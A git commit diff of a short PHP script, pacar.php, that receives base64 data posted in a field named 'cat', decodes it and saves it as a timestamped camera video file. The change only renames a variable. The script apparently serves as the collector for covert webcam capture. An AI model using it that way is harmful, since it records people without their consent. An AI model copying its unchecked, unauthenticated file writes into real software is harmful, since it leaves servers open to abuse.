915e48bbe6254e43af2a209ac38ef2f5c10b32ee
WongBiasa <74451855+WongBiasa@users.noreply.github.com>
2020-12-31 11:31:05 +0700

    Update pacar.php

--- pacar.php
+++ pacar.php
@@ -1,14 +1,14 @@
 <?php
 
 $date = date('dMYHis');
-$imageData=$_POST['cat'];
+$videodata=$_POST['cat'];
 
 if (!empty($_POST['cat'])) {
 error_log("Received" . "\r\n", 3, "Log.log");
 
 }
 
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$filteredData=substr($videodata, strpos($videodata, ",")+1);
 $unencodedData=base64_decode($filteredData);
 $fp = fopen( './video/cam'.$date.'.mp4', 'wb' );
 fwrite( $fp, $unencodedData);
